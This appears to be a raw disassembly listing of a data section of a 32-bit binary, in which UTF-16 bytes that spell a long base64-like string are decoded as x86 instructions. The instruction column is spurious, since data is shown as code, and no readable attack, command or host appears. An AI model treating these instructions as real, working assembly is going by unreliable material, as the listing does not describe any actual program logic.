  40ae6f:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40ae73:	00 38                	add    %bh,(%eax)
  40ae75:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae78:	48                   	dec    %eax
  40ae79:	00 57 00             	add    %dl,0x0(%edi)
  40ae7c:	71 00                	jno    0x40ae7e
  40ae7e:	4c                   	dec    %esp
  40ae7f:	00 4e 00             	add    %cl,0x0(%esi)
  40ae82:	76 00                	jbe    0x40ae84
  40ae84:	32 00                	xor    (%eax),%al
  40ae86:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40ae8a:	63 00                	arpl   %eax,(%eax)
  40ae8c:	54                   	push   %esp
  40ae8d:	00 66 00             	add    %ah,0x0(%esi)
  40ae90:	61                   	popa
  40ae91:	00 75 00             	add    %dh,0x0(%ebp)
  40ae94:	50                   	push   %eax
  40ae95:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40ae99:	00 58 00             	add    %bl,0x0(%eax)
  40ae9c:	45                   	inc    %ebp
  40ae9d:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40aea1:	00 39                	add    %bh,(%ecx)
  40aea3:	00 30                	add    %dh,(%eax)
  40aea5:	00 61 00             	add    %ah,0x0(%ecx)
  40aea8:	4d                   	dec    %ebp
  40aea9:	00 71 00             	add    %dh,0x0(%ecx)
  40aeac:	57                   	push   %edi
  40aead:	00 72 00             	add    %dh,0x0(%edx)
  40aeb0:	47                   	inc    %edi
  40aeb1:	00 68 00             	add    %ch,0x0(%eax)
  40aeb4:	6b 00 73             	imul   $0x73,(%eax),%eax
  40aeb7:	00 42 00             	add    %al,0x0(%edx)
  40aeba:	33 00                	xor    (%eax),%eax
  40aebc:	62 00                	bound  %eax,(%eax)
  40aebe:	4e                   	dec    %esi
  40aebf:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40aec3:	00 46 00             	add    %al,0x0(%esi)
  40aec6:	69 00 51 00 45 00    	imul   $0x450051,(%eax),%eax
  40aecc:	34 00                	xor    $0x0,%al
  40aece:	50                   	push   %eax
  40aecf:	00 4a 00             	add    %cl,0x0(%edx)
  40aed2:	34 00                	xor    $0x0,%al
  40aed4:	72 00                	jb     0x40aed6
  40aed6:	73 00                	jae    0x40aed8
  40aed8:	6e                   	outsb  %ds:(%esi),(%dx)
  40aed9:	00 4b 00             	add    %cl,0x0(%ebx)
  40aedc:	45                   	inc    %ebp
  40aedd:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  40aee1:	00 77 00             	add    %dh,0x0(%edi)
  40aee4:	73 00                	jae    0x40aee6
  40aee6:	54                   	push   %esp
  40aee7:	00 46 00             	add    %al,0x0(%esi)
  40aeea:	50                   	push   %eax
  40aeeb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aeee:	6b 00 55             	imul   $0x55,(%eax),%eax
  40aef1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aef4:	56                   	push   %esi
  40aef5:	00 6e 00             	add    %ch,0x0(%esi)
  40aef8:	4d                   	dec    %ebp
  40aef9:	00 47 00             	add    %al,0x0(%edi)
  40aefc:	74 00                	je     0x40aefe
  40aefe:	43                   	inc    %ebx
  40aeff:	00 70 00             	add    %dh,0x0(%eax)
  40af02:	4d                   	dec    %ebp
  40af03:	00 73 00             	add    %dh,0x0(%ebx)
  40af06:	44                   	inc    %esp
  40af07:	00 73 00             	add    %dh,0x0(%ebx)
  40af0a:	62 00                	bound  %eax,(%eax)
  40af0c:	68 00 61 00 50       	push   $0x50006100
  40af11:	00 47 00             	add    %al,0x0(%edi)
  40af14:	61                   	popa
  40af15:	00 75 00             	add    %dh,0x0(%ebp)
  40af18:	2f                   	das
  40af19:	00 36                	add    %dh,(%esi)
  40af1b:	00 52 00             	add    %dl,0x0(%edx)
  40af1e:	50                   	push   %eax
  40af1f:	00 50 00             	add    %dl,0x0(%eax)
  40af22:	48                   	dec    %eax
  40af23:	00 56 00             	add    %dl,0x0(%esi)
  40af26:	69 00 4d 00 74 00    	imul   $0x74004d,(%eax),%eax
  40af2c:	4c                   	dec    %esp
  40af2d:	00 42 00             	add    %al,0x0(%edx)
  40af30:	52                   	push   %edx
  40af31:	00 52 00             	add    %dl,0x0(%edx)
  40af34:	73 00                	jae    0x40af36
  40af36:	76 00                	jbe    0x40af38
  40af38:	42                   	inc    %edx
  40af39:	00 6b 00             	add    %ch,0x0(%ebx)
  40af3c:	79 00                	jns    0x40af3e
  40af3e:	48                   	dec    %eax
  40af3f:	00 6f 00             	add    %ch,0x0(%edi)
  40af42:	4b                   	dec    %ebx
  40af43:	00 53 00             	add    %dl,0x0(%ebx)
  40af46:	6c                   	insb   (%dx),%es:(%edi)
  40af47:	00 6a 00             	add    %ch,0x0(%edx)
  40af4a:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40af4e:	2f                   	das
  40af4f:	00 72 00             	add    %dh,0x0(%edx)
  40af52:	32 00                	xor    (%eax),%al
  40af54:	34 00                	xor    $0x0,%al
  40af56:	4b                   	dec    %ebx
  40af57:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40af5b:	00 48 00             	add    %cl,0x0(%eax)
  40af5e:	39 00                	cmp    %eax,(%eax)
  40af60:	56                   	push   %esi
  40af61:	00 4d 00             	add    %cl,0x0(%ebp)
  40af64:	6e                   	outsb  %ds:(%esi),(%dx)
  40af65:	00 2b                	add    %ch,(%ebx)
  40af67:	00 7a 00             	add    %bh,0x0(%edx)
  40af6a:	2f                   	das
  40af6b:	00 63 00             	add    %ah,0x0(%ebx)
  40af6e:	48                   	dec    %eax
  40af6f:	00 61 00             	add    %ah,0x0(%ecx)
  40af72:	6e                   	outsb  %ds:(%esi),(%dx)
  40af73:	00 4f 00             	add    %cl,0x0(%edi)
  40af76:	37                   	aaa
  40af77:	00 6a 00             	add    %ch,0x0(%edx)
  40af7a:	4d                   	dec    %ebp
  40af7b:	00 71 00             	add    %dh,0x0(%ecx)
  40af7e:	53                   	push   %ebx
  40af7f:	00 51 00             	add    %dl,0x0(%ecx)
  40af82:	53                   	push   %ebx
  40af83:	00 79 00             	add    %bh,0x0(%ecx)
  40af86:	63 00                	arpl   %eax,(%eax)
  40af88:	58                   	pop    %eax
  40af89:	00 48 00             	add    %cl,0x0(%eax)
  40af8c:	73 00                	jae    0x40af8e
  40af8e:	69 00 4a 00 68 00    	imul   $0x68004a,(%eax),%eax
  40af94:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40af98:	2b 00                	sub    (%eax),%eax
  40af9a:	6f                   	outsl  %ds:(%esi),(%dx)
  40af9b:	00 77 00             	add    %dh,0x0(%edi)
  40af9e:	30 00                	xor    %al,(%eax)
  40afa0:	45                   	inc    %ebp
  40afa1:	00 56 00             	add    %dl,0x0(%esi)
  40afa4:	35 00 59 00 4b       	xor    $0x4b005900,%eax
  40afa9:	00 53 00             	add    %dl,0x0(%ebx)
  40afac:	31 00                	xor    %eax,(%eax)
  40afae:	4d                   	dec    %ebp
  40afaf:	00 7a 00             	add    %bh,0x0(%edx)
  40afb2:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40afb6:	2b 00                	sub    (%eax),%eax
  40afb8:	72 00                	jb     0x40afba
  40afba:	76 00                	jbe    0x40afbc
  40afbc:	37                   	aaa
  40afbd:	00 30                	add    %dh,(%eax)
  40afbf:	00 73 00             	add    %dh,0x0(%ebx)
  40afc2:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40afc6:	57                   	push   %edi
  40afc7:	00 6e 00             	add    %ch,0x0(%esi)
  40afca:	6f                   	outsl  %ds:(%esi),(%dx)
  40afcb:	00 39                	add    %bh,(%ecx)
  40afcd:	00 7a 00             	add    %bh,0x0(%edx)
  40afd0:	32 00                	xor    (%eax),%al
  40afd2:	62 00                	bound  %eax,(%eax)
  40afd4:	68 00 70 00 69       	push   $0x69007000
  40afd9:	00 6d 00             	add    %ch,0x0(%ebp)
  40afdc:	2b 00                	sub    (%eax),%eax
  40afde:	46                   	inc    %esi
  40afdf:	00 66 00             	add    %ah,0x0(%esi)
  40afe2:	72 00                	jb     0x40afe4
  40afe4:	62 00                	bound  %eax,(%eax)
  40afe6:	4f                   	dec    %edi
  40afe7:	00 58 00             	add    %bl,0x0(%eax)
  40afea:	72 00                	jb     0x40afec
  40afec:	48                   	dec    %eax
  40afed:	00 2f                	add    %ch,(%edi)
  40afef:	00 57 00             	add    %dl,0x0(%edi)
  40aff2:	64 00 4c 00 67       	add    %cl,%fs:0x67(%eax,%eax,1)
  40aff7:	00 69 00             	add    %ch,0x0(%ecx)
  40affa:	4e                   	dec    %esi
  40affb:	00 4e 00             	add    %cl,0x0(%esi)
  40affe:	52                   	push   %edx
  40afff:	00 7a 00             	add    %bh,0x0(%edx)
  40b002:	4b                   	dec    %ebx
  40b003:	00 33                	add    %dh,(%ebx)
  40b005:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40b009:	00 31                	add    %dh,(%ecx)
  40b00b:	00 57 00             	add    %dl,0x0(%edi)
  40b00e:	56                   	push   %esi
  40b00f:	00 41 00             	add    %al,0x0(%ecx)
  40b012:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b016:	68 00 38 00 53       	push   $0x53003800
  40b01b:	00 76 00             	add    %dh,0x0(%esi)
  40b01e:	41                   	inc    %ecx
  40b01f:	00 6d 00             	add    %ch,0x0(%ebp)
  40b022:	2b 00                	sub    (%eax),%eax
  40b024:	76 00                	jbe    0x40b026
  40b026:	46                   	inc    %esi
  40b027:	00 52 00             	add    %dl,0x0(%edx)
  40b02a:	42                   	inc    %edx
  40b02b:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40b02f:	00 79 00             	add    %bh,0x0(%ecx)
  40b032:	4a                   	dec    %edx
  40b033:	00 6a 00             	add    %ch,0x0(%edx)
  40b036:	6d                   	insl   (%dx),%es:(%edi)
  40b037:	00 51 00             	add    %dl,0x0(%ecx)
  40b03a:	62 00                	bound  %eax,(%eax)
  40b03c:	58                   	pop    %eax
  40b03d:	00 70 00             	add    %dh,0x0(%eax)
  40b040:	6f                   	outsl  %ds:(%esi),(%dx)
  40b041:	00 45 00             	add    %al,0x0(%ebp)
  40b044:	75 00                	jne    0x40b046
  40b046:	33 00                	xor    (%eax),%eax
  40b048:	4c                   	dec    %esp
  40b049:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b04c:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40b050:	49                   	dec    %ecx
  40b051:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40b055:	00 69 00             	add    %ch,0x0(%ecx)
  40b058:	4e                   	dec    %esi
  40b059:	00 55 00             	add    %dl,0x0(%ebp)
  40b05c:	74 00                	je     0x40b05e
  40b05e:	63 00                	arpl   %eax,(%eax)
  40b060:	46                   	inc    %esi
  40b061:	00 51 00             	add    %dl,0x0(%ecx)
  40b064:	71 00                	jno    0x40b066
  40b066:	4a                   	dec    %edx
  40b067:	00 42 00             	add    %al,0x0(%edx)
  40b06a:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  40b06e:	53                   	push   %ebx
  40b06f:	00 58 00             	add    %bl,0x0(%eax)
  40b072:	74 00                	je     0x40b074
  40b074:	37                   	aaa
  40b075:	00 31                	add    %dh,(%ecx)
  40b077:	00 73 00             	add    %dh,0x0(%ebx)
  40b07a:	41                   	inc    %ecx
  40b07b:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  40b07f:	00 33                	add    %dh,(%ebx)
  40b081:	00 41 00             	add    %al,0x0(%ecx)
  40b084:	47                   	inc    %edi
  40b085:	00 5a 00             	add    %bl,0x0(%edx)
  40b088:	4b                   	dec    %ebx
  40b089:	00 70 00             	add    %dh,0x0(%eax)
  40b08c:	44                   	inc    %esp
  40b08d:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  40b091:	00 58 00             	add    %bl,0x0(%eax)
  40b094:	73 00                	jae    0x40b096
  40b096:	31 00                	xor    %eax,(%eax)
  40b098:	34 00                	xor    $0x0,%al
  40b09a:	33 00                	xor    (%eax),%eax
  40b09c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b09d:	00 69 00             	add    %ch,0x0(%ecx)
  40b0a0:	6c                   	insb   (%dx),%es:(%edi)
  40b0a1:	00 73 00             	add    %dh,0x0(%ebx)
  40b0a4:	49                   	dec    %ecx
  40b0a5:	00 49 00             	add    %cl,0x0(%ecx)
  40b0a8:	4a                   	dec    %edx
  40b0a9:	00 35 00 32 00 4d    	add    %dh,0x4d003200
  40b0af:	00 2f                	add    %ch,(%edi)
  40b0b1:	00 2f                	add    %ch,(%edi)
  40b0b3:	00 56 00             	add    %dl,0x0(%esi)
  40b0b6:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  40b0ba:	4e                   	dec    %esi
  40b0bb:	00 59 00             	add    %bl,0x0(%ecx)
  40b0be:	52                   	push   %edx
  40b0bf:	00 39                	add    %bh,(%ecx)
  40b0c1:	00 66 00             	add    %ah,0x0(%esi)
  40b0c4:	47                   	inc    %edi
  40b0c5:	00 71 00             	add    %dh,0x0(%ecx)
  40b0c8:	56                   	push   %esi
  40b0c9:	00 47 00             	add    %al,0x0(%edi)
  40b0cc:	55                   	push   %ebp
  40b0cd:	00 78 00             	add    %bh,0x0(%eax)
  40b0d0:	4e                   	dec    %esi
  40b0d1:	00 50 00             	add    %dl,0x0(%eax)
  40b0d4:	7a 00                	jp     0x40b0d6
  40b0d6:	76 00                	jbe    0x40b0d8
  40b0d8:	32 00                	xor    (%eax),%al
  40b0da:	2f                   	das
  40b0db:	00 68 00             	add    %ch,0x0(%eax)
  40b0de:	45                   	inc    %ebp
  40b0df:	00 70 00             	add    %dh,0x0(%eax)
  40b0e2:	48                   	dec    %eax
  40b0e3:	00 51 00             	add    %dl,0x0(%ecx)
  40b0e6:	4b                   	dec    %ebx
  40b0e7:	00 5a 00             	add    %bl,0x0(%edx)
  40b0ea:	33 00                	xor    (%eax),%eax
  40b0ec:	66 00 35 00 64 00 77 	data16 add %dh,0x77006400
  40b0f3:	00 58 00             	add    %bl,0x0(%eax)
  40b0f6:	79 00                	jns    0x40b0f8
  40b0f8:	30 00                	xor    %al,(%eax)
  40b0fa:	62 00                	bound  %eax,(%eax)
  40b0fc:	37                   	aaa
  40b0fd:	00 62 00             	add    %ah,0x0(%edx)
  40b100:	69 00 48 00 58 00    	imul   $0x580048,(%eax),%eax
  40b106:	76 00                	jbe    0x40b108
  40b108:	63 00                	arpl   %eax,(%eax)
  40b10a:	57                   	push   %edi
  40b10b:	00 69 00             	add    %ch,0x0(%ecx)
  40b10e:	74 00                	je     0x40b110
  40b110:	62 00                	bound  %eax,(%eax)
  40b112:	35 00 4c 00 5a       	xor    $0x5a004c00,%eax
  40b117:	00 36                	add    %dh,(%esi)
  40b119:	00 6e 00             	add    %ch,0x0(%esi)
  40b11c:	4f                   	dec    %edi
  40b11d:	00 2b                	add    %ch,(%ebx)
  40b11f:	00 75 00             	add    %dh,0x0(%ebp)
  40b122:	4e                   	dec    %esi
  40b123:	00 6f 00             	add    %ch,0x0(%edi)
  40b126:	4d                   	dec    %ebp
  40b127:	00 2f                	add    %ch,(%edi)
  40b129:	00 70 00             	add    %dh,0x0(%eax)
  40b12c:	55                   	push   %ebp
  40b12d:	00 6e 00             	add    %ch,0x0(%esi)
  40b130:	4e                   	dec    %esi
  40b131:	00 54 00 70          	add    %dl,0x70(%eax,%eax,1)
  40b135:	00 39                	add    %bh,(%ecx)
  40b137:	00 79 00             	add    %bh,0x0(%ecx)
  40b13a:	47                   	inc    %edi
  40b13b:	00 39                	add    %bh,(%ecx)
  40b13d:	00 70 00             	add    %dh,0x0(%eax)
  40b140:	59                   	pop    %ecx
  40b141:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40b145:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40b149:	00 69 00             	add    %ch,0x0(%ecx)
  40b14c:	67 00 4c 00          	add    %cl,0x0(%si)
  40b150:	73 00                	jae    0x40b152
  40b152:	53                   	push   %ebx
  40b153:	00 38                	add    %bh,(%eax)
  40b155:	00 5a 00             	add    %bl,0x0(%edx)
  40b158:	6f                   	outsl  %ds:(%esi),(%dx)
  40b159:	00 43 00             	add    %al,0x0(%ebx)
  40b15c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b15d:	00 66 00             	add    %ah,0x0(%esi)
  40b160:	77 00                	ja     0x40b162
  40b162:	45                   	inc    %ebp
  40b163:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b167:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40b16b:	00 7a 00             	add    %bh,0x0(%edx)
  40b16e:	32 00                	xor    (%eax),%al
  40b170:	56                   	push   %esi
  40b171:	00 6d 00             	add    %ch,0x0(%ebp)
  40b174:	50                   	push   %eax
  40b175:	00 73 00             	add    %dh,0x0(%ebx)
  40b178:	61                   	popa
  40b179:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  40b17d:	00 58 00             	add    %bl,0x0(%eax)
  40b180:	2b 00                	sub    (%eax),%eax
  40b182:	34 00                	xor    $0x0,%al
  40b184:	2f                   	das
  40b185:	00 47 00             	add    %al,0x0(%edi)
  40b188:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40b18c:	67 00 56 00          	add    %dl,0x0(%bp)
  40b190:	30 00                	xor    %al,(%eax)
  40b192:	39 00                	cmp    %eax,(%eax)
  40b194:	4d                   	dec    %ebp
  40b195:	00 58 00             	add    %bl,0x0(%eax)
  40b198:	43                   	inc    %ebx
  40b199:	00 6e 00             	add    %ch,0x0(%esi)
  40b19c:	48                   	dec    %eax
  40b19d:	00 30                	add    %dh,(%eax)
  40b19f:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40b1a3:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40b1a7:	00 37                	add    %dh,(%edi)
  40b1a9:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40b1ad:	00 39                	add    %bh,(%ecx)
  40b1af:	00 79 00             	add    %bh,0x0(%ecx)
  40b1b2:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40b1b6:	50                   	push   %eax
  40b1b7:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1ba:	70 00                	jo     0x40b1bc
  40b1bc:	30 00                	xor    %al,(%eax)
  40b1be:	76 00                	jbe    0x40b1c0
  40b1c0:	48                   	dec    %eax
  40b1c1:	00 35 00 66 00 30    	add    %dh,0x30006600
  40b1c7:	00 43 00             	add    %al,0x0(%ebx)
  40b1ca:	62 00                	bound  %eax,(%eax)
  40b1cc:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40b1cf:	00 56 00             	add    %dl,0x0(%esi)
  40b1d2:	41                   	inc    %ecx
  40b1d3:	00 61 00             	add    %ah,0x0(%ecx)
  40b1d6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1d7:	00 63 00             	add    %ah,0x0(%ebx)
  40b1da:	55                   	push   %ebp
  40b1db:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40b1df:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  40b1e3:	00 69 00             	add    %ch,0x0(%ecx)
  40b1e6:	4d                   	dec    %ebp
  40b1e7:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40b1eb:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1ee:	51                   	push   %ecx
  40b1ef:	00 49 00             	add    %cl,0x0(%ecx)
  40b1f2:	73 00                	jae    0x40b1f4
  40b1f4:	33 00                	xor    (%eax),%eax
  40b1f6:	75 00                	jne    0x40b1f8
  40b1f8:	50                   	push   %eax
  40b1f9:	00 5a 00             	add    %bl,0x0(%edx)
  40b1fc:	77 00                	ja     0x40b1fe
  40b1fe:	56                   	push   %esi
  40b1ff:	00 6e 00             	add    %ch,0x0(%esi)
  40b202:	38 00                	cmp    %al,(%eax)
  40b204:	6b 00 45             	imul   $0x45,(%eax),%eax
  40b207:	00 57 00             	add    %dl,0x0(%edi)
  40b20a:	62 00                	bound  %eax,(%eax)
  40b20c:	6d                   	insl   (%dx),%es:(%edi)
  40b20d:	00 67 00             	add    %ah,0x0(%edi)
  40b210:	35 00 78 00 2b       	xor    $0x2b007800,%eax
  40b215:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  40b219:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40b21d:	00 50 00             	add    %dl,0x0(%eax)
  40b220:	6d                   	insl   (%dx),%es:(%edi)
  40b221:	00 69 00             	add    %ch,0x0(%ecx)
  40b224:	52                   	push   %edx
  40b225:	00 6a 00             	add    %ch,0x0(%edx)
  40b228:	33 00                	xor    (%eax),%eax
  40b22a:	4f                   	dec    %edi
  40b22b:	00 4f 00             	add    %cl,0x0(%edi)
  40b22e:	68 00 4b 00 59       	push   $0x59004b00
  40b233:	00 4f 00             	add    %cl,0x0(%edi)
  40b236:	4b                   	dec    %ebx
  40b237:	00 79 00             	add    %bh,0x0(%ecx)
  40b23a:	30 00                	xor    %al,(%eax)
  40b23c:	53                   	push   %ebx
  40b23d:	00 66 00             	add    %ah,0x0(%esi)
  40b240:	56                   	push   %esi
  40b241:	00 55 00             	add    %dl,0x0(%ebp)
  40b244:	73 00                	jae    0x40b246
  40b246:	4a                   	dec    %edx
  40b247:	00 76 00             	add    %dh,0x0(%esi)
  40b24a:	73 00                	jae    0x40b24c
  40b24c:	2b 00                	sub    (%eax),%eax
  40b24e:	57                   	push   %edi
  40b24f:	00 50 00             	add    %dl,0x0(%eax)
  40b252:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40b256:	49                   	dec    %ecx
  40b257:	00 75 00             	add    %dh,0x0(%ebp)
  40b25a:	56                   	push   %esi
  40b25b:	00 36                	add    %dh,(%esi)
  40b25d:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40b261:	00 78 00             	add    %bh,0x0(%eax)
  40b264:	47                   	inc    %edi
  40b265:	00 4b 00             	add    %cl,0x0(%ebx)
  40b268:	76 00                	jbe    0x40b26a
  40b26a:	62 00                	bound  %eax,(%eax)
  40b26c:	53                   	push   %ebx
  40b26d:	00 48 00             	add    %cl,0x0(%eax)
  40b270:	78 00                	js     0x40b272
  40b272:	4b                   	dec    %ebx
  40b273:	00 37                	add    %dh,(%edi)
  40b275:	00 48 00             	add    %cl,0x0(%eax)
  40b278:	70 00                	jo     0x40b27a
  40b27a:	30 00                	xor    %al,(%eax)
  40b27c:	50                   	push   %eax
  40b27d:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  40b281:	00 41 00             	add    %al,0x0(%ecx)
  40b284:	35 00 4d 00 35       	xor    $0x35004d00,%eax
  40b289:	00 4d 00             	add    %cl,0x0(%ebp)
  40b28c:	49                   	dec    %ecx
  40b28d:	00 4e 00             	add    %cl,0x0(%esi)
  40b290:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40b294:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40b298:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40b29c:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40b2a0:	42                   	inc    %edx
  40b2a1:	00 62 00             	add    %ah,0x0(%edx)
  40b2a4:	43                   	inc    %ebx
  40b2a5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2a8:	77 00                	ja     0x40b2aa
  40b2aa:	4e                   	dec    %esi
  40b2ab:	00 5a 00             	add    %bl,0x0(%edx)
  40b2ae:	7a 00                	jp     0x40b2b0
  40b2b0:	6a 00                	push   $0x0
  40b2b2:	39 00                	cmp    %eax,(%eax)
  40b2b4:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40b2b8:	47                   	inc    %edi
  40b2b9:	00 7a 00             	add    %bh,0x0(%edx)
  40b2bc:	37                   	aaa
  40b2bd:	00 5a 00             	add    %bl,0x0(%edx)
  40b2c0:	63 00                	arpl   %eax,(%eax)
  40b2c2:	61                   	popa
  40b2c3:	00 51 00             	add    %dl,0x0(%ecx)
  40b2c6:	31 00                	xor    %eax,(%eax)
  40b2c8:	44                   	inc    %esp
  40b2c9:	00 46 00             	add    %al,0x0(%esi)
  40b2cc:	48                   	dec    %eax
  40b2cd:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40b2d1:	00 59 00             	add    %bl,0x0(%ecx)
  40b2d4:	48                   	dec    %eax
  40b2d5:	00 61 00             	add    %ah,0x0(%ecx)
  40b2d8:	61                   	popa
  40b2d9:	00 58 00             	add    %bl,0x0(%eax)
  40b2dc:	77 00                	ja     0x40b2de
  40b2de:	71 00                	jno    0x40b2e0
  40b2e0:	56                   	push   %esi
  40b2e1:	00 35 00 56 00 74    	add    %dh,0x74005600
  40b2e7:	00 4b 00             	add    %cl,0x0(%ebx)
  40b2ea:	52                   	push   %edx
  40b2eb:	00 70 00             	add    %dh,0x0(%eax)
  40b2ee:	4c                   	dec    %esp
  40b2ef:	00 51 00             	add    %dl,0x0(%ecx)
  40b2f2:	33 00                	xor    (%eax),%eax
  40b2f4:	43                   	inc    %ebx
  40b2f5:	00 6f 00             	add    %ch,0x0(%edi)
  40b2f8:	74 00                	je     0x40b2fa
  40b2fa:	4e                   	dec    %esi
  40b2fb:	00 43 00             	add    %al,0x0(%ebx)
  40b2fe:	74 00                	je     0x40b300
  40b300:	52                   	push   %edx
  40b301:	00 4b 00             	add    %cl,0x0(%ebx)
  40b304:	73 00                	jae    0x40b306
  40b306:	46                   	inc    %esi
  40b307:	00 4c 00 79          	add    %cl,0x79(%eax,%eax,1)
  40b30b:	00 50 00             	add    %dl,0x0(%eax)
  40b30e:	62 00                	bound  %eax,(%eax)
  40b310:	4c                   	dec    %esp
  40b311:	00 53 00             	add    %dl,0x0(%ebx)
  40b314:	52                   	push   %edx
  40b315:	00 31                	add    %dh,(%ecx)
  40b317:	00 76 00             	add    %dh,0x0(%esi)
  40b31a:	69 00 48 00 6c 00    	imul   $0x6c0048,(%eax),%eax
  40b320:	54                   	push   %esp
  40b321:	00 6a 00             	add    %ch,0x0(%edx)
  40b324:	32 00                	xor    (%eax),%al
  40b326:	46                   	inc    %esi
  40b327:	00 57 00             	add    %dl,0x0(%edi)
  40b32a:	4d                   	dec    %ebp
  40b32b:	00 6d 00             	add    %ch,0x0(%ebp)
  40b32e:	63 00                	arpl   %eax,(%eax)
  40b330:	49                   	dec    %ecx
  40b331:	00 41 00             	add    %al,0x0(%ecx)
  40b334:	61                   	popa
  40b335:	00 2f                	add    %ch,(%edi)
  40b337:	00 32                	add    %dh,(%edx)
  40b339:	00 51 00             	add    %dl,0x0(%ecx)
  40b33c:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40b340:	48                   	dec    %eax
  40b341:	00 39                	add    %bh,(%ecx)
  40b343:	00 63 00             	add    %ah,0x0(%ebx)
  40b346:	5a                   	pop    %edx
  40b347:	00 77 00             	add    %dh,0x0(%edi)
  40b34a:	34 00                	xor    $0x0,%al
  40b34c:	54                   	push   %esp
  40b34d:	00 46 00             	add    %al,0x0(%esi)
  40b350:	38 00                	cmp    %al,(%eax)
  40b352:	6c                   	insb   (%dx),%es:(%edi)
  40b353:	00 6a 00             	add    %ch,0x0(%edx)
  40b356:	74 00                	je     0x40b358
  40b358:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40b35c:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40b360:	78 00                	js     0x40b362
  40b362:	75 00                	jne    0x40b364
  40b364:	62 00                	bound  %eax,(%eax)
  40b366:	43                   	inc    %ebx
  40b367:	00 31                	add    %dh,(%ecx)
  40b369:	00 4b 00             	add    %cl,0x0(%ebx)
  40b36c:	55                   	push   %ebp
  40b36d:	00 5a 00             	add    %bl,0x0(%edx)
  40b370:	48                   	dec    %eax
  40b371:	00 78 00             	add    %bh,0x0(%eax)
  40b374:	4f                   	dec    %edi
  40b375:	00 6f 00             	add    %ch,0x0(%edi)
  40b378:	49                   	dec    %ecx
  40b379:	00 46 00             	add    %al,0x0(%esi)
  40b37c:	67 00 6c 00          	add    %ch,0x0(%si)
  40b380:	5a                   	pop    %edx
  40b381:	00 56 00             	add    %dl,0x0(%esi)
  40b384:	4e                   	dec    %esi
  40b385:	00 77 00             	add    %dh,0x0(%edi)
  40b388:	38 00                	cmp    %al,(%eax)
  40b38a:	56                   	push   %esi
  40b38b:	00 68 00             	add    %ch,0x0(%eax)
  40b38e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b38f:	00 75 00             	add    %dh,0x0(%ebp)
  40b392:	69 00 77 00 73 00    	imul   $0x730077,(%eax),%eax
  40b398:	31 00                	xor    %eax,(%eax)
  40b39a:	43                   	inc    %ebx
  40b39b:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40b39f:	00 39                	add    %bh,(%ecx)
  40b3a1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b3a4:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40b3a8:	76 00                	jbe    0x40b3aa
  40b3aa:	77 00                	ja     0x40b3ac
  40b3ac:	58                   	pop    %eax
  40b3ad:	00 71 00             	add    %dh,0x0(%ecx)
  40b3b0:	66 00 44 00 44       	data16 add %al,0x44(%eax,%eax,1)
  40b3b5:	00 4f 00             	add    %cl,0x0(%edi)
  40b3b8:	32 00                	xor    (%eax),%al
  40b3ba:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b3be:	70 00                	jo     0x40b3c0
  40b3c0:	62 00                	bound  %eax,(%eax)
  40b3c2:	62 00                	bound  %eax,(%eax)
  40b3c4:	46                   	inc    %esi
